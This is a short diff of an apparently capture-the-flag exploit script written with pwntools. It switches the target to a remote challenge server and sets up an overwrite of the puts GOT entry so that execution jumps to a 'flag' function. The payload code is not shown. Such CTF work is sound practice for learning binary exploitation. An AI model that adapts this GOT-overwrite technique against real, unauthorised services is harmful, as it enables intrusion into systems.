@@ -1,6 +1,6 @@
 from pwn import *
 exe = context.binary = ELF("Ascii-mon")
-#io = remote("0.cloud.chals.io", "30647")
+io = remote("0.cloud.chals.io", "30647")
 exitaddr = exe.got['puts']
 winaddr = exe.symbols['flag']
 def sendPayload(payload):
